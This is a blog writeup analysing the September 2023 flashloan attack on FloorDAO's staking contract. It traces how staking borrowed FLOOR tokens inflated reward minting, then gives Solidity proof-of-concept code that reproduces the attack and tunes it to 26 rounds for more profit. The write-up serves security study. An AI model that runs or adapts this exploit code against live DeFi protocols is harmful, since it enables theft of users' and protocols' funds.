---
description: First published on Hashnode on Sep 18, 2023
---

# \[Web3 Hack Writeup Series - 2] The Flashloan's fault(20230905\_FloorDAO )

## Attack Overview

Hello everyone, this is the second installment of the Web3 Hack Writeup Series. For more information about this series, please refer to my [first article](https://dappopia.hashnode.dev/web3-hack-writeup-series-1-a-special-reentrancy-of-earningfarm-at-20230809).

Getting straight to the point, today we will examine a fascinating web3 attack case. This incident occurred on September 5, 2023, when an attacker targeted the Staking contract of FloorDAO and conducted a 40 ETH arbitrage.

<figure><img src="../../../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

The first step in analyzing an attack is to identify the vulnerabilities.

I must admit that this time, I followed the flow of information about the entire attack for quite some time, scrutinizing the details of multiple contracts. However, when I finally reached the step where the attack succeeded, I was shocked to realize that, from a conventional logic perspective, this couldn't be considered a vulnerability.

But here's the catch: blockchain is unconventional. In the world of DeFi, there is a special entity that Traditional Finance (TradFi) would never have: the Flashloan.

Speaking of flashloans, those familiar with web3 are likely no strangers to them. In most attacks, attackers use flashloans primarily to increase their capital to maximize profits. However, from another perspective, the existence of flashloans also makes many economic models that would be secure under conventional logic vulnerable. And that's what we're going to explore today.

Following the tradition of our series, we will first analyze the data flow of the attack, then replicate the attack process, further discuss other attack strategies and better attack outcomes, and finally provide a summary.

## Workflow Analysis

This is the data flow corresponding to the attack transaction. For more details, you can check it [here](https://explorer.phalcon.xyz/tx/eth/0x1274b32d4dfacd2703ad032e8bd669a83f012dde9d27ed92e4e7da0387adafe4).

<figure><img src="../../../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

Indeed, at first glance, it appears quite complex. However, first and foremost, we need to grasp the key points:

* The attacker initiated a flashloan, borrowing all the FLOOR tokens from the WETH-FLOOR pool in Uniswap V3.
* Subsequently, the attacker staked all the FLOOR tokens in the staking pool, obtaining a certain share of gFLOOR tokens.
* Finally, the attacker unstaked all gFLOOR tokens, exchanging them back for FLOOR tokens. Due to the rewards offered by the FLOOR staking pool, the attacker received more FLOOR tokens than initially staked, completing the arbitrage in a single transaction.

This process was repeated 17 times, resulting in the 40 ETH attack.

Once we understand these key points, analyzing the vulnerability becomes straightforward. We only need to examine how the act of staking facilitates the distribution of rewards.

As I mentioned at the beginning, the tracing process is somewhat intricate, so I won't repeat it here. I will illustrate my findings using a chain of causation (keeping only the essentials):

```makefile
The conversion rate between FLOOR tokens and gFLOOR tokens is determined 
by the index (contract sFLOOR). 
-> index = gons.div(_gonsPerFragment), where index is determined by 
    _gonsPerFragment (contract sFLOOR). 
-> _gonsPerFragment = TOTAL_GONS.div(_totalSupply), meaning _gonsPerFragment 
    is determined by _totalSupply (contract sFLOOR). 
-> The increase in _totalSupply is represented by rebaseAmount(contract sFLOOR). 
-> rebaseAmount is sourced from the profit of the Staking Pool(contract FloorStaking). 
-> The profit of the Staking Pool is influenced by the quantity of tokens 
    staked by users (contract FloorStaking).
```

When users stake FLOOR tokens, the index correspondingly increases. When they unstake, the redemption amount is calculated using this higher index, resulting in a larger amount of redeemed FLOOR tokens.

Furthermore, if we trace this back to the Treasury contract, we can find that these seemingly "extra" FLOOR tokens are minted with excessReserves as collateral.

<figure><img src="../../../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

Therefore, we can arrive at a concise conclusion: When users deposit funds into the Staking Pool, the Floor protocol will mint additional FLOOR tokens back into the staking pool as rewards for users, as long as the reserve allows it.

When the attacker staked a substantial amount of funds, they naturally received a larger reward. This is why when the attacker utilized the entire FLOOR pool in Uniswap, they were able to profit significantly from the pool.

At this point, you might have some questions: Can FLOOR tokens be infinitely minted? Is there an upper limit? Is there an issue with the Floor protocol's minting logic, and why doesn't the index adjust when users unstake?

Don't worry; these questions will be addressed one by one in the following sections.

## POC

With the analysis above, our replication process becomes more straightforward.

### testExploit()

Functions starting with 'test' are default test functions. Firstly, we need to read the existing quantity of FLOOR tokens in the Uniswap pool and execute a flashloan. The specific attack relies on the funds obtained through the flashloan (as described below). Afterward, we output the quantity of FLOOR tokens the attacker acquired and the value after swapping to WETH.

```solidity
function testExploit() public {
        flashAmount = floor.balanceOf(address(floorUniPool)) - 1;
        floorUniPool.flash(address(this), 0, flashAmount, "");
        uint256 profitAmount = floor.balanceOf(address(this));
        emit log_named_decimal_uint("FLOOR token balance of attacker", profitAmount, floor.decimals());
        floorUniPool.swap(address(this), false, int256(profitAmount), uint160(0xfFfd8963EFd1fC6A506488495d951d5263988d25), "");
        emit log_named_decimal_uint("WETH balance of attacker", WETH.balanceOf(address(this)), WETH.decimals());
    }
```

### UniswapV3FlashCallback()

This is the standard callback function for flashloans, where the attack logic using flashloan funds is typically placed. Since our attack was carried out 17 times, we set up a loop to repeat it 17 times. Before diving into the specific attack logic, let's go back and examine a detail in the FloorStaking contract:

<figure><img src="../../../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

We can observe that the `epoch.distribute` is assigned a value only when `balance > staked.add(bounty)`, otherwise, it remains 0. Looking at line 224, we can see that in the next call to the `rebase()` contract, `epoch.distribute` is passed into the `rebase()` function of the sFLOOR contract as `_profit`, affecting the amount of newly minted tokens:

<figure><img src="../../../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

So, to achieve a successful attack (i.e., to enable token minting), we need to ensure that `balance > staked.add(bounty)`, meaning that `attackerBalance + stakingBalance > circulatingSupply`. When this condition is met, we can execute stake and unstake actions to arbitrage.

Finally, the borrowed amount, along with the fees, needs to be returned to the Uniswap pool.

```solidity
function uniswapV3FlashCallback(uint256 fee0 , uint256 fee1, bytes calldata) external {
        for (uint i = 1; i <= 17; i++) {
            uint attackerBalance = floor.balanceOf(address(this));
            uint stakingBalance = floor.balanceOf(address(staking));
            uint circulatingSupply = sFloor.circulatingSupply();
            if (attackerBalance + stakingBalance > circulatingSupply) {
                emit log_named_uint("Iteration", i);
                floor.approve(address(staking), attackerBalance);
                staking.stake(address(this), attackerBalance, false, true);
                uint gFloorBalance = gFloor.balanceOf(address(this));
                staking.unstake(address(this), gFloorBalance, true, false);
                emit log_named_decimal_uint("FLOOR token balance ", floor.balanceOf(address(this)), floor.decimals());
            }
        }
        floor.transfer(msg.sender, flashAmount + fee1);
    }
```

### uniswapV3SwapCallback()

Observing the final data flow, we can see that the attacker converted all obtained FLOOR tokens back into WETH using Uniswap. Since the Floor protocol's Uniswap pool utilizes the IUniswapV3Pool interface for token swapping, it needs to call uniswapV3SwapCallback() as per the standard (details can be found [here](https://docs.uniswap.org/contracts/v3/reference/core/interfaces/callback/IUniswapV3SwapCallback)). In this callback function, we need to transfer the tokens to be exchanged to the Uniswap pool.

```solidity
function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
        floor.transfer(msg.sender, uint256(amount1Delta));
    }
```

With this, our attack contract is essentially complete. Running the corresponding exp will yield a successful result. （You can find all the code for this article [here](https://github.com/descartes100/Web3Hack).）

## Optimizing Attack Strategies

Upon observing the exp function, you might have the same question as me: why does it have to be exactly 17 times? Can we perform more iterations?

So, I attempted arbitraging 18 times, 19 times, and even 20 times. To my surprise, the code executed smoothly, and the final profits continued to increase.

At this point, it's essential to ask the classic question: what is the upper limit on the number of arbitrage rounds? How much can we maximize our profits?

### Attempt 1: Continue arbitraging as long as attackerBalance + stakingBalance > circulatingSupply.

As we learned from the previous analysis, as long as the above condition holds, tokens will continue to be minted, providing us with the potential for arbitrage. So, we made a slight modification to the code (see exp\_2).

```solidity
function uniswapV3FlashCallback(uint256 fee0 , uint256 fee1, bytes calldata) external {
        uint i = 1;
        while(true) {
            uint attackerBalance = floor.balanceOf(address(this));
            uint stakingBalance = floor.balanceOf(address(staking));
            uint circulatingSupply = sFloor.circulatingSupply();
            if (attackerBalance + stakingBalance > circulatingSupply) {
                emit log_named_uint("Iteration", i);
                floor.approve(address(staking), attackerBalance);
                staking.stake(address(this), attackerBalance, false, true);
                uint256 mintAmount = distributor.nextRewardFor(address(staking));
                uint256 reserves = treasury.excessReserves();
                emit log_named_uint("Next reward amount ", mintAmount);
                emit log_named_uint("excess reserves", reserves);
                uint gFloorBalance = gFloor.balanceOf(address(this));
                staking.unstake(address(this), gFloorBalance, true, false);
                emit log_named_decimal_uint("FLOOR token balance ", floor.balanceOf(address(this)), floor.decimals());
                i += 1;
            } else {
                break;
            }
        }
        floor.transfer(msg.sender, flashAmount + fee1);
    }
```

<figure><img src="../../../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

However, we encountered an issue: The error occurred in the distribute function of the Distributor contract when Treasury attempted to mint more tokens, triggering an "insufficient reserves" error.

This mistake provided us with a valuable clue: by identifying the location where the error is triggered, we could potentially determine the reserve amount, which in turn would reveal our upper limit for token minting.

### Attempt 2: mintAmount <= reserves then continue arbitraging.

By examining the Distributor contract and the Treasury contract, we found the point where the code went wrong:

<figure><img src="../../../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

To ensure the code doesn't encounter errors, we need to ensure that the condition `amount <= excessReserves()` holds in the mint function of Treasury. excessReserves is a public function, so directly reading its value is feasible. However, the amount comes from `nextRewardAt(info[i].rate)`. While `nextRewardAt` is also a public function, we need to know `info`, the value of `i`, and read its `rate`, which complicates matters. Looking at the entire code, even though `info[]` is public, the question arises: what is the value of `i`? If we attempt to find `_amount` from this perspective, it would mean understanding the logic of reading and writing `info`, which is a substantial effort.

At this point, I began to contemplate whether there might be a simpler way to access this `nextReward`. Ideally, we should be able to provide an address and know the amount of tokens it will be rewarded with in the next round.

Excitingly, after a thorough examination of the contract code, I found it! It's the `nextRewardFor()` function: a view function for the next reward for a specified address!

<figure><img src="../../../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

With this discovery, our attack logic can now be implemented: we read the values of `nextRewardFor()` and `excessReserves()` and perform arbitrage only when the condition holds. (see exp\_3)

```solidity
function uniswapV3FlashCallback(uint256 fee0 , uint256 fee1, bytes calldata) external {
        uint i = 1;
        while(true) {
            uint attackerBalance = floor.balanceOf(address(this));
            uint stakingBalance = floor.balanceOf(address(staking));
            uint circulatingSupply = sFloor.circulatingSupply();
            if (attackerBalance + stakingBalance > circulatingSupply) {
                emit log_named_uint("Iteration", i);
                floor.approve(address(staking), attackerBalance);
                staking.stake(address(this), attackerBalance, false, true);
                uint256 mintAmount = distributor.nextRewardFor(address(staking));
                uint256 reserves = treasury.excessReserves();
                emit log_named_uint("Next reward amount ", mintAmount);
                emit log_named_uint("excess reserves", reserves);
                if (mintAmount <= reserves) {
                    uint gFloorBalance = gFloor.balanceOf(address(this));
                    staking.unstake(address(this), gFloorBalance, true, false);
                    emit log_named_decimal_uint("FLOOR token balance ", floor.balanceOf(address(this)), floor.decimals());
                    i += 1;
                } else {
                    break;
                }
            }
        }
        floor.transfer(msg.sender, flashAmount + fee1);
    }
```

However, it's important to note that when `mintAmount > reserves` for the first time, we have actually crossed a boundary. Attempting to execute `unstake()` at this point would inevitably result in an error due to insufficient reserves, so we choose to break.

<figure><img src="../../../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

This erroneous outcome was within our expectations. After the final stake, we did not perform an unstake, which means the attacker's account had no FLOOR tokens to repay the Flashloan.

<figure><img src="../../../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

However, this error helped us identify the upper limit of the attack - which is 27! Attempting to arbitrage 27 times would exceed the bounds, so 26 rounds of arbitrage will be our upper limit.

### Attempt 3: Execute 26 rounds of arbitrage.

This final attack is relatively conventional, involving 26 rounds of arbitrage. As you can see, we obtained a profit of 42 ETH, a 5% improvement compared to before. (see exp\_4)

To verify our conclusion, we attempted 27 rounds of attack, and indeed, it resulted in an error due to insufficient reserves. Therefore, the optimal attack strategy is to perform 26 rounds of arbitrage.

## Conclusion

In conclusion, I would like to address a question that was left unanswered earlier: Is there a problem with the FloorDAO protocol's minting logic, and why doesn't the index adjust when users unstake?

My answer is that there isn't inherently a problem with the FloorDAO protocol's minting logic. The index doesn't need to be adjusted when users unstake. To understand this, we need to revisit the motivation behind the FloorDAO protocol implementing the "minting" feature - it's designed to encourage users to stake more. This rewarding action is not meant to continue indefinitely but only occurs within the bounds allowed by Treasury reserves. It's a controlled benefit to users. In other words, whether users will unstake or not was not within the considerations when designing the reward function. The project primarily aims to encourage the action of staking, emphasizing "flow" rather than "stock." As for the index, it is inherently linked to the quantity of tokens. Therefore, the more staking activity, the more minting, and the higher the index value - this logic is sound.

So, what is the issue?

The issue arises due to the atomic nature of blockchain transactions and the presence of flashloans. Users can create a substantial amount of staking "flow" in a short period without necessarily bringing "stock." This is inconsistent with conventional thinking because a regular user typically brings both "flow" and "stock" to a staking system. This is the behavior that the project essentially wants to encourage.

This attack provides us with valuable insights:

For project teams, when designing incentive models, security considerations should not be limited to "conventional" thinking. Don't forget that in blockchain, there are unique transactions like flashloans. This requires our economic models to ensure robustness even in the most extreme conditions, not just under typical circumstances. What's considered "extreme" in blockchain is often "conventional."

For attackers (security developers), it's essential to be adept at finding answers in publicly available information - any public function or variable could provide clues about the code's state. You can also view this exposed data as breakpoints set by smart contracts in advance. This exposed information helps us understand the real-time dynamics of a contract, allowing us to discover the optimal attack paths.

## Reference

\[1] Attack tx: [https://explorer.phalcon.xyz/tx/eth/0x1274b32d4dfacd2703ad032e8bd669a83f012dde9d27ed92e4e7da0387adafe4](https://explorer.phalcon.xyz/tx/eth/0x1274b32d4dfacd2703ad032e8bd669a83f012dde9d27ed92e4e7da0387adafe4)

\[2] FloorStaking contract: [https://etherscan.io/address/0x759c6De5bcA9ADE8A1a2719a31553c4B7DE02539#code](https://etherscan.io/address/0x759c6De5bcA9ADE8A1a2719a31553c4B7DE02539#code)

\[3] Distributor contract: [https://etherscan.io/address/0x9e3cee6ca6e4c11fc6200a17545003b6cf6635d0#code](https://etherscan.io/address/0x9e3cee6ca6e4c11fc6200a17545003b6cf6635d0#code)

\[4] sFLOOR contract: [https://etherscan.io/address/0x164AFe96912099543BC2c48bb9358a095Db8e784#code](https://etherscan.io/address/0x164AFe96912099543BC2c48bb9358a095Db8e784#code)

\[5] FloorTreasury contract: [https://etherscan.io/address/0x91E453f442d25523F42063E1695390e325076ca2#code](https://etherscan.io/address/0x91E453f442d25523F42063E1695390e325076ca2#code)
